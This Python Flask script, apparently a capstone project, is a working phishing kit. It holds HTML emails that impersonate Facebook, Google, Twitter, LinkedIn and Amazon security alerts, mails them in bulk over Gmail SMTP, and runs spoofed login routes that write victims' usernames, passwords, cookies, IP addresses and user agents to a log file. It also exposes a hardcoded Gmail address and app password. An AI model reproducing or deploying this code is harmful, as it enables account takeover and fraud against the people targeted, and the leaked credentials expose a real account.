from flask import Flask, request, render_template
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import random
import string
from datetime import datetime
from flask import Flask, request, redirect
import os
import threading

# Flask app initialization
app = Flask(__name__, template_folder=r"C:\Users\premp\Desktop\CAPSTONEPROJECT\templates")

# File path for logging captured credentials and generated emails
LOG_FILE_PATH = r"C:\Users\premp\Desktop\CAPSTONEPROJECT\credentials_log.txt"
EMAIL_FILE_PATH = r"C:\Users\premp\Desktop\CAPSTONEPROJECT\emails.txt"

# Hardcoded sender credentials
SENDER_EMAIL = "vamsi3590@gmail.com"  # Enter your Gmail address
SENDER_PASSWORD = "wuuc fusx emti dmto"  # Enter your Gmail App Password
MY_EMAIL = "vchebrolu4590@gmail.com"  # Your specific email

# Enhanced Email templates for different platforms
EMAIL_TEMPLATES = {
    "Facebook": """
    <html>
        <body style="font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f4f4f4;">
          <div style="width: 100%; text-align: center; padding: 20px;">
            <div style="max-width: 600px; margin: 0 auto; padding: 30px; background-color: #ffffff; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
              <div style="text-align: center; padding-bottom: 20px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Facebook_Logo_2023.png/800px-Facebook_Logo_2023.png" alt="Facebook Logo" style="max-width: 150px;">
              </div>
              <h2 style="font-size: 22px; color: #333; text-align: center;">Action Required: Verify Your Facebook Account</h2>
              <p style="font-size: 16px; color: #555; text-align: center;">
                We noticed suspicious activity on your Facebook account. Please verify your identity by clicking the button below to secure your account.
              </p>
              <div style="text-align: center; margin-top: 30px;">
                <a href="http://127.0.0.1:5000/capture?platform=facebook" style="background-color: #1877f2; color: white; padding: 15px 30px; font-size: 18px; text-decoration: none; border-radius: 5px; display: inline-block;">
                  Verify Now
                </a>
              </div>
              <p style="font-size: 14px; color: #777; text-align: center; margin-top: 30px;">
                If you did not request this action, please ignore this email or contact Facebook support.
              </p>
            </div>
          </div>
        </body>
    </html>
    """,
    "Google": """
    <html>
        <body style="font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f4f4f4;">
          <div style="width: 100%; text-align: center; padding: 20px;">
            <div style="max-width: 600px; margin: 0 auto; padding: 30px; background-color: #ffffff; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
              <div style="text-align: center; padding-bottom: 20px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5b/Google_logo_2023.png" alt="Google Logo" style="max-width: 150px;">
              </div>
              <h2 style="font-size: 22px; color: #333; text-align: center;">Action Required: Verify Your Google Account</h2>
              <p style="font-size: 16px; color: #555; text-align: center;">
                We noticed suspicious activity on your Google account. Please verify your identity by clicking the button below to secure your account.
              </p>
              <div style="text-align: center; margin-top: 30px;">
                <a href="http://127.0.0.1:5000/capture?platform=google" style="background-color: #db4437; color: white; padding: 15px 30px; font-size: 18px; text-decoration: none; border-radius: 5px; display: inline-block;">
                  Verify Now
                </a>
              </div>
              <p style="font-size: 14px; color: #777; text-align: center; margin-top: 30px;">
                If you did not request this action, please ignore this email or contact Google support.
              </p>
            </div>
          </div>
        </body>
    </html>
    """,
    "Twitter": """
    <html>
        <body style="font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f4f4f4;">
          <div style="width: 100%; text-align: center; padding: 20px;">
            <div style="max-width: 600px; margin: 0 auto; padding: 30px; background-color: #ffffff; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
              <div style="text-align: center; padding-bottom: 20px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/6/69/Twitter_Logo_as_of_2021.svg" alt="Twitter Logo" style="max-width: 150px;">
              </div>
              <h2 style="font-size: 22px; color: #333; text-align: center;">Action Required: Verify Your Twitter Account</h2>
              <p style="font-size: 16px; color: #555; text-align: center;">
                We noticed suspicious activity on your Twitter account. Please verify your identity by clicking the button below to secure your account.
              </p>
              <div style="text-align: center; margin-top: 30px;">
                <a href="http://127.0.0.1:5000/capture?platform=twitter" style="background-color: #1DA1F2; color: white; padding: 15px 30px; font-size: 18px; text-decoration: none; border-radius: 5px; display: inline-block;">
                  Verify Now
                </a>
              </div>
              <p style="font-size: 14px; color: #777; text-align: center; margin-top: 30px;">
                If you did not request this action, please ignore this email or contact Twitter support.
              </p>
            </div>
          </div>
        </body>
    </html>
    """,
    "LinkedIn": """
    <html>
        <body style="font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f4f4f4;">
          <div style="width: 100%; text-align: center; padding: 20px;">
            <div style="max-width: 600px; margin: 0 auto; padding: 30px; background-color: #ffffff; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
              <div style="text-align: center; padding-bottom: 20px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/9/99/LinkedIn_Logo_2023.png" alt="LinkedIn Logo" style="max-width: 150px;">
              </div>
              <h2 style="font-size: 22px; color: #333; text-align: center;">Action Required: Verify Your LinkedIn Account</h2>
              <p style="font-size: 16px; color: #555; text-align: center;">
                We noticed suspicious activity on your LinkedIn account. Please verify your identity by clicking the button below to secure your account.
              </p>
              <div style="text-align: center; margin-top: 30px;">
                <a href="http://127.0.0.1:5000/capture?platform=linkedin" style="background-color: #0077B5; color: white; padding: 15px 30px; font-size: 18px; text-decoration: none; border-radius: 5px; display: inline-block;">
                  Verify Now
                </a>
              </div>
              <p style="font-size: 14px; color: #777; text-align: center; margin-top: 30px;">
                If you did not request this action, please ignore this email or contact LinkedIn support.
              </p>
            </div>
          </div>
        </body>
    </html>
    """,
    "Amazon": """
    <html>
        <body style="font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f4f4f4;">
          <div style="width: 100%; text-align: center; padding: 20px;">
            <div style="max-width: 600px; margin: 0 auto; padding: 30px; background-color: #ffffff; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
              <div style="text-align: center; padding-bottom: 20px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" style="max-width: 150px;">
              </div>
              <h2 style="font-size: 22px; color: #333; text-align: center;">Action Required: Verify Your Amazon Account</h2>
              <p style="font-size: 16px; color: #555; text-align: center;">
                We noticed suspicious activity on your Amazon account. Please verify your identity by clicking the button below to secure your account.
              </p>
              <div style="text-align: center; margin-top: 30px;">
                <a href="http://127.0.0.1:5000/capture?platform=amazon" style="background-color: #FF9900; color: white; padding: 15px 30px; font-size: 18px; text-decoration: none; border-radius: 5px; display: inline-block;">
                  Verify Now
                </a>
              </div>
              <p style="font-size: 14px; color: #777; text-align: center; margin-top: 30px;">
                If you did not request this action, please ignore this email or contact Amazon support.
              </p>
            </div>
          </div>
        </body>
    </html>
    """
}

# Function to generate random emails
def generate_random_emails(num_emails, include_email):
    domains = ['gmail.com', 'facebook.com', 'twitter.com', 'amazon.com', 'linkedin.com']
    emails = []

    # Include the specified email
    emails.append(include_email)

    # Generate remaining random emails
    for _ in range(num_emails - 1):  # Subtract 1 because we added one manually
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(5, 10)))
        domain = random.choice(domains)
        email = f"{username}@{domain}"
        emails.append(email)

    # Save to file
    os.makedirs(os.path.dirname(EMAIL_FILE_PATH), exist_ok=True)
    with open(EMAIL_FILE_PATH, "w") as file:
        file.write("\n".join(emails))
    return emails

# Function to send phishing email to a list of recipients
def send_email(platform, recipients):
    try:
        for recipient in recipients:
            msg = MIMEMultipart()
            msg['From'] = SENDER_EMAIL
            msg['To'] = recipient
            msg['Subject'] = f"{platform} Security Alert"
            msg.attach(MIMEText(EMAIL_TEMPLATES[platform], 'html'))

            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                server.login(SENDER_EMAIL, SENDER_PASSWORD)
                server.sendmail(SENDER_EMAIL, recipient, msg.as_string())
            print(f"Phishing email sent to {recipient} for {platform}.")
    except Exception as e:
        print(f"Error sending email: {e}")

# Filter emails by the selected platform, excluding specific email
def filter_emails_by_platform(emails, platform, exclude_email):
    domain_map = {
        "Facebook": "facebook.com",
        "Google": "gmail.com",
        "Twitter": "twitter.com",
        "Amazon": "amazon.com",
        "LinkedIn": "linkedin.com"
    }
    domain = domain_map.get(platform)
    return [email for email in emails if email.endswith(domain) and email != exclude_email]

# Capture data on POST request
@app.route('/capture', methods=['GET', 'POST'])
def capture_data():
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Get referrer and cookies
    referrer = request.referrer if request.referrer else 'None'
    cookies = request.cookies if request.cookies else 'None'
    
    # Capture the platform from GET (query parameter) or POST (hidden form field)
    platform = request.args.get('platform', 'unknown').capitalize()  # Capture from GET request (URL)
    
    if request.method == 'POST':
        # Capture username and password from the form submission
        username = request.form.get('username', 'None')
        password = request.form.get('password', 'None')
        
        # Log the captured data to the file
        with open(LOG_FILE_PATH, 'a') as file:
            file.write(f"Platform: {platform}\n")
            file.write(f"Timestamp: {timestamp}\n")
            file.write(f"IP Address: {user_ip}\n")
            file.write(f"User Agent: {user_agent}\n")
            file.write(f"Referrer: {referrer}\n")
            file.write(f"Cookies: {cookies}\n")
            file.write(f"Username: {username}\n")
            file.write(f"Password: {password}\n")
            file.write("---\n")

        # Redirect to the relevant platform's page after data capture
        return redirect(f'/{platform.lower()}')  # Redirect to a platform-specific page

    # If it's a GET request (click event), log the event
    with open(LOG_FILE_PATH, 'a') as file:
        file.write(f"CLICK DETECTED - User clicked the {platform} link\n")
        file.write(f"Timestamp: {timestamp}\n")
        file.write(f"IP Address: {user_ip}\n")
        file.write(f"User Agent: {user_agent}\n")
        file.write(f"Referrer: {referrer}\n")
        file.write(f"Cookies: {cookies}\n")
        file.write("---\n")

    # Redirect to the phishing page (mimic platform login or something relevant)
    return redirect(f'/{platform.lower()}')  # Redirect to the platform's page (e.g., /facebook, /google, etc.)

# Routes for platform phishing pages
@app.route('/facebook', methods=['GET', 'POST'])
def facebook_phishing_page():
    if request.method == 'POST':
        return capture_data()  # Redirects to /capture
    return render_template('facebook.html')  # Template for Facebook phishing page

@app.route('/google', methods=['GET', 'POST'])
def google_phishing_page():
    if request.method == 'POST':
        return capture_data()  # Redirects to /capture
    return render_template('google.html')  # Template for Google phishing page

@app.route('/twitter', methods=['GET', 'POST'])
def twitter_phishing_page():
    if request.method == 'POST':
        return capture_data()  # Redirects to /capture
    return render_template('twitter.html')  # Template for Twitter phishing page

@app.route('/amazon', methods=['GET', 'POST'])
def amazon_phishing_page():
    if request.method == 'POST':
        return capture_data()  # Redirects to /capture
    return render_template('amazon.html')  # Template for Amazon phishing page

@app.route('/linkedin', methods=['GET', 'POST'])
def linkedin_phishing_page():
    if request.method == 'POST':
        return capture_data()  # Redirects to /capture
    return render_template('linkedin.html')  # Template for LinkedIn phishing page

# Main function to run the script
if __name__ == '__main__':
    # Generate random emails and save them to file
    print("Generating random emails...")
    random_emails = generate_random_emails(50, MY_EMAIL)
    print(f"Random emails saved to {EMAIL_FILE_PATH}.")

    # Prompt user to choose platform for phishing email
    print("Choose the platform:")
    print("1. Facebook")
    print("2. Google")
    print("3. Twitter")
    print("4. Amazon")
    print("5. LinkedIn")
    choice = input("Enter your choice (1/2/3/4/5): ")

    platform_map = {
        "1": "Facebook", 
        "2": "Google", 
        "3": "Twitter", 
        "4": "Amazon", 
        "5": "LinkedIn"
    }
    platform = platform_map.get(choice, None)

    if platform:
        # Filter emails by chosen platform and exclude your email
        filtered_emails = filter_emails_by_platform(random_emails, platform, MY_EMAIL)
        
        # Send phishing emails to the filtered list
        print(f"Sending phishing emails to {len(filtered_emails)} {platform} recipients...")
        send_email(platform, filtered_emails)
        
        # Send a separate email to your email
        print(f"Sending phishing email separately to {MY_EMAIL}...")
        send_email(platform, [MY_EMAIL])
    else:
        print("Invalid choice. No email sent.")

    # Start Flask server in the background
    flask_thread = threading.Thread(target=app.run, kwargs={'host': '127.0.0.1', 'port': 5000, 'debug': True, 'use_reloader': False})
    flask_thread.daemon = True
    flask_thread.start()

    print("Flask server is running. Please wait...")

    # Keep the main thread alive for Flask to serve requests
    flask_thread.join()

